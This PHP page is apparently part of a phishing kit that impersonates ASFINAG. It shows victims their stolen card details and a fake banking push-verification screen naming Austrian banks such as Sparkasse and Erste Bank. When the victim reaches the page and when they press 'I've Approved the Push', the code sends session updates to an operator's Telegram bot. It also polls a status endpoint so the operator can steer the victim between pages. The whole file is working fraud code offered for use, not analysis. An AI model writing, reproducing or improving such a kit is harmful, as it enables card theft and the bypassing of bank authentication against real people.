<?php
require_once 'config.php';

$sessionId = $_GET['session'] ?? '';
if (!preg_match('/^[a-f0-9]{32}$/', $sessionId)) {
    header("Location: " . buildPageUrl('payments'));
    exit();
}

$sessionFile = SESSIONS_DIR . '/' . $sessionId . '.json';
if (!file_exists($sessionFile)) {
    header("Location: " . buildPageUrl('payments'));
    exit();
}

$sessionData = json_decode(file_get_contents($sessionFile), true);
$sessionData['session_id'] = $sessionId;
$cardData = $sessionData['card_data'];

if (isCardBlocked($cardData['number'])) {
    header("Location: " . buildPageUrl('payments'));
    exit();
}

$pageTitle = 'Push Verification';
$checkStatusUrl = buildPageUrl('check_status');

$pushSentFile = SESSIONS_DIR . '/' . $sessionId . '.push_sent';
$pushApprovedFile = SESSIONS_DIR . '/' . $sessionId . '.push_approved';

// Update current page on load (atomic update to preserve all data)
updateSessionData($sessionId, function(&$sessionData) use ($pageTitle) {
    $sessionData['current_page'] = $pageTitle;
    return true;
});

// Handle push approval
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['approve'])) {
        
        file_put_contents($pushApprovedFile, '1');
        
        // Use atomic update to prevent race conditions and get latest session data
        $sendSuccess = false;
        $rootMessageId = null;
        $responseData = null;
        
        updateSessionData($sessionId, function(&$sessionData) use ($sessionId, &$sendSuccess, &$rootMessageId, &$responseData) {
            $adminConfig = getAdminConfigFromSession($sessionData);
            $chatId = $adminConfig['chat_id'] ?? ADMIN_CHAT_ID;
            
            // Get root message ID
            $rootMessageId = $sessionData['root_message']['message_id'] ?? $sessionData['last_message']['message_id'] ?? null;
            
            // #region agent log
            $logData = ['sessionId' => $sessionId, 'rootMessageId' => $rootMessageId, 'hasRootMessage' => !empty($sessionData['root_message']), 'hasLastMessage' => !empty($sessionData['last_message'])];
            file_put_contents('d:\botworker\better_pay\.cursor\debug.log', json_encode(['location' => 'push.php:50', 'message' => 'Push approval before send', 'data' => $logData, 'timestamp' => time() * 1000, 'sessionId' => 'debug-session', 'runId' => 'run1', 'hypothesisId' => 'A,C']) . "\n", FILE_APPEND);
            // #endregion
            
            $replyText = "✅ *USER APPROVED PUSH*\n";
            $replyText .= "Session: `$sessionId`";
            
            // Send push approval to Telegram (always send, even if rootMessageId is missing)
            $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
            $data = [
                'chat_id' => $chatId,
                'text' => $replyText,
                'parse_mode' => 'Markdown'
            ];
            
            // Add reply_to_message_id only if available
            if ($rootMessageId) {
                $data['reply_to_message_id'] = $rootMessageId;
            }
            
            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL => $url,
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => $data,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 10
            ]);
            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $curlError = curl_error($ch);
            curl_close($ch);
            
            // Parse response to check if it succeeded
            $responseData = json_decode($response, true);
            $sendSuccess = ($httpCode === 200 && !empty($responseData['ok']));
            
            
            // Log if sending failed
            if (!$sendSuccess) {
                error_log("Push approval send failed: HTTP $httpCode, Error: $curlError, Response: $response");
            }
            
            // Update root message
            $sessionData['current_page'] = 'Push Verification';
            updateRootMessage($sessionData);
            
            return true;
        });
        
        header("Location: " . buildPageUrl('waiting', ['session' => $sessionId]));
        exit();
    }
}

// Defer Telegram notify until after we send the HTML so the page doesn't hang (lock/API wait)
$shouldNotifyPush = !file_exists($pushSentFile);
?>
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ASFINAG - Push Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: #f3f4f6;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .asfinag-container {
            max-width: 520px;
            width: 100%;
            background: white;
            border-radius: 16px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }

        .asfinag-header {
            background: #ea580c;
            padding: 32px 24px;
            text-align: center;
        }

        .asfinag-logo {
            margin-bottom: 16px;
        }

        .asfinag-logo svg {
            width: 120px;
            height: auto;
        }

        .asfinag-title {
            color: white;
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 6px;
        }

        .asfinag-subtitle {
            color: rgba(255, 255, 255, 0.9);
            font-size: 14px;
        }

        .asfinag-content {
            padding: 32px 28px;
            background: white;
        }

        /* Card Preview */
        .card-preview-block {
            background: #fef3c7;
            border-left: 4px solid #ea580c;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 28px;
            text-align: center;
        }

        .card-number-masked {
            font-size: 20px;
            font-weight: 700;
            color: #ea580c;
            margin-bottom: 8px;
            letter-spacing: 1px;
        }

        .card-info-details {
            font-size: 13px;
            color: #6b7280;
        }

        /* Status Indicator */
        .status-indicator-block {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-bottom: 24px;
            padding: 12px 16px;
            background: #fef3c7;
            border-radius: 10px;
            font-size: 14px;
            color: #ea580c;
        }

        .status-dot {
            width: 8px;
            height: 8px;
            background: #ea580c;
            border-radius: 50%;
            animation: blink 1.5s infinite;
        }

        /* Push Content */
        .push-content-block {
            text-align: center;
            margin-bottom: 28px;
        }

        .push-icon {
            font-size: 70px;
            margin-bottom: 20px;
            animation: pulse 2s infinite;
        }

        .push-message-text {
            font-size: 16px;
            margin-bottom: 25px;
            color: #374151;
            line-height: 1.6;
        }

        /* Approve Button */
        .approve-push-btn {
            width: 100%;
            padding: 14px;
            background: #16a34a;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.2s;
        }

        .approve-push-btn:hover:not(:disabled) {
            background: #15803d;
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(22, 163, 74, 0.3);
        }

        .approve-push-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        /* Security Notice */
        .security-notice-block {
            background: #f9fafb;
            border-radius: 10px;
            padding: 14px 18px;
            font-size: 12px;
            color: #6b7280;
            text-align: center;
            border: 1px solid #e5e7eb;
            margin-bottom: 20px;
        }

        .security-notice-block strong {
            color: #ea580c;
            font-weight: 600;
        }

        /* Timer */
        .timer-block {
            text-align: center;
            font-size: 13px;
            color: #9ca3af;
        }

        .countdown-timer {
            font-weight: 700;
            color: #ea580c;
        }

        /* Bank Apps */
        .bank-apps-row {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin: 20px 0;
            flex-wrap: wrap;
        }

        .bank-app-item {
            background: white;
            border-radius: 10px;
            padding: 8px 14px;
            font-size: 11px;
            font-weight: 600;
            color: #374151;
            border: 1px solid #e5e7eb;
            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
        }

        /* Loading Overlay */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.95);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            transition: all 0.3s ease;
        }

        .loading-overlay.active {
            opacity: 1;
            visibility: visible;
        }

        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #e5e7eb;
            border-top: 4px solid #ea580c;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        /* Animations */
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.08); }
            100% { transform: scale(1); }
        }

        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0.3; }
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        body {
            opacity: 0;
            transition: opacity 0.25s ease;
        }

        body.page-loaded {
            opacity: 1;
        }

        body.page-leave {
            opacity: 0;
        }

        @media (max-width: 480px) {
            .asfinag-content {
                padding: 24px 20px;
            }
            .asfinag-header {
                padding: 24px 20px;
            }
            .push-icon {
                font-size: 55px;
            }
            .push-message-text {
                font-size: 14px;
            }
            .asfinag-title {
                font-size: 24px;
            }
        }
    </style>
</head>
<body>
    <div class="asfinag-container">
        <div class="asfinag-header">
            <div class="asfinag-logo">
                <svg viewBox="0 0 200 60" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <rect width="200" height="60" rx="8" fill="white"/>
                    <text x="100" y="38" font-size="24" font-weight="800" text-anchor="middle" fill="#ea580c" font-family="Arial, sans-serif" letter-spacing="2">ASFINAG</text>
                </svg>
            </div>
            <h1 class="asfinag-title">Push Notification</h1>
            <p class="asfinag-subtitle">Approve the transaction in your banking app</p>
        </div>
        
        <div class="asfinag-content">
            <div class="card-preview-block">
                <div class="card-number-masked">
                    **** **** **** <?= substr($cardData['number'], -4) ?>
                </div>
                <div class="card-info-details">
                    <?= htmlspecialchars($cardData['holder']) ?> • Expires <?= htmlspecialchars($cardData['expiry']) ?>
                </div>
            </div>
            
            <div class="status-indicator-block">
                <div class="status-dot"></div>
                <span>Waiting for approval...</span>
            </div>
            
            <form method="POST" action="push.php?session=<?= $sessionId ?>" id="push-form">
                <div class="push-content-block">
                    <div class="push-icon">🔔</div>
                    
                    <div class="push-message-text">
                        A push notification has been sent to your banking app. 
                        Please open your app and approve the transaction to continue.
                    </div>
                    
                    <div class="bank-apps-row">
                        <div class="bank-app-item">🏦 Sparkasse</div>
                        <div class="bank-app-item">🏦 Raiffeisen</div>
                        <div class="bank-app-item">🏦 Bank Austria</div>
                        <div class="bank-app-item">🏦 Erste Bank</div>
                    </div>
                    
                    <button type="submit" name="approve" value="1" class="approve-push-btn" id="approve-btn">
                        ✅ I've Approved the Push
                    </button>
                </div>
            </form>
            
            <div class="security-notice-block">
                <strong>Note:</strong> If you don't receive the notification within 2 minutes, 
                please check your banking app or try another verification method.
            </div>
            
            <div class="timer-block">
                Waiting for: <span class="countdown-timer" id="countdown">05:00</span>
            </div>
        </div>
    </div>

    <div class="loading-overlay" id="loading-overlay">
        <div class="loading-spinner"></div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            document.body.classList.add('page-loaded');
            
            const approveBtn = document.getElementById('approve-btn');
            const form = document.getElementById('push-form');
            const loadingOverlay = document.getElementById('loading-overlay');
            let countdown = 300;
            let secondsWaiting = 0;
            
            startCountdown();
            startWaitingTimer();
            
            setInterval(function() {
                checkPushApproval();
            }, 10000);
            
            function checkPushApproval() {
                console.log('Checking for push approval...');
            }
            
            function startCountdown() {
                const countdownElement = document.getElementById('countdown');
                
                const timer = setInterval(function() {
                    const minutes = Math.floor(countdown / 60);
                    const seconds = countdown % 60;
                    
                    countdownElement.textContent = 
                        minutes.toString().padStart(2, '0') + ':' + 
                        seconds.toString().padStart(2, '0');
                    
                    if (countdown <= 60) {
                        countdownElement.style.color = '#dc2626';
                    }
                    
                    if (countdown <= 0) {
                        clearInterval(timer);
                        countdownElement.textContent = '00:00';
                        approveBtn.disabled = true;
                        approveBtn.textContent = 'Session Expired';
                        approveBtn.style.background = '#dc2626';
                    }
                    
                    countdown--;
                }, 1000);
            }
            
            function startWaitingTimer() {
                const statusText = document.querySelector('.status-indicator-block span');
                
                setInterval(function() {
                    secondsWaiting++;
                    const minutes = Math.floor(secondsWaiting / 60);
                    const seconds = secondsWaiting % 60;
                    statusText.textContent = `Waiting for approval... (${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')})`;
                }, 1000);
            }
            
            form.addEventListener('submit', function(e) {
                showLoading();
            });
            
            function showLoading() {
                loadingOverlay.classList.add('active');
            }
            
            setTimeout(function() {
                window.location.reload();
            }, 30000);
            
            if (window.history.replaceState) {
                window.history.replaceState(null, null, window.location.href);
            }
            
            approveBtn.addEventListener('click', function() {
                this.style.transform = 'scale(0.95)';
                setTimeout(() => {
                    this.style.transform = 'scale(1)';
                }, 150);
            });
        });
    </script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const sessionId = <?= json_encode($sessionId) ?>;
            const pageTitle = <?= json_encode($pageTitle) ?>;
            const checkStatusUrl = <?= json_encode($checkStatusUrl) ?>;
            
            const poll = () => {
                fetch(`${checkStatusUrl}?session=${encodeURIComponent(sessionId)}&page=${encodeURIComponent(pageTitle)}`)
                    .then(response => response.json())
                    .then(data => {
                        if (data.redirect) {
                            window.location.href = data.redirect;
                        }
                    })
                    .catch(() => {});
            };
            
            poll();
            setInterval(poll, 3000);
            
            document.querySelectorAll('a[href]').forEach(link => {
                link.addEventListener('click', () => document.body.classList.add('page-leave'));
            });
            document.querySelectorAll('form').forEach(form => {
                form.addEventListener('submit', () => document.body.classList.add('page-leave'));
            });
        });
    </script>
    <?php require_once 'presence_client.php'; ?>
</body>
</html>
<?php
// Run slow Telegram notify after response is sent so the page doesn't hang
if (!empty($shouldNotifyPush) && !empty($sessionId)) {
    if (function_exists('fastcgi_finish_request')) {
        fastcgi_finish_request();
    } else {
        if (ob_get_level()) ob_end_flush();
        flush();
    }
    updateSessionData($sessionId, function(&$sessionData) use ($sessionId) {
        $adminConfig = getAdminConfigFromSession($sessionData);
        $chatId = $adminConfig['chat_id'] ?? ADMIN_CHAT_ID;
        $rootMessageId = $sessionData['root_message']['message_id'] ?? $sessionData['last_message']['message_id'] ?? null;
        $replyText = "📱 *User on PUSH page*\n";
        $replyText .= "Session: `$sessionId`";
        if ($rootMessageId) {
            $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
            $data = [
                'chat_id' => $chatId,
                'text' => $replyText,
                'parse_mode' => 'Markdown',
                'reply_to_message_id' => $rootMessageId
            ];
            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL => $url,
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => $data,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 10
            ]);
            curl_exec($ch);
            curl_close($ch);
        }
        $sessionData['current_page'] = 'Push Verification';
        updateRootMessage($sessionData);
        return true;
    });
    file_put_contents(SESSIONS_DIR . '/' . $sessionId . '.push_sent', '1');
}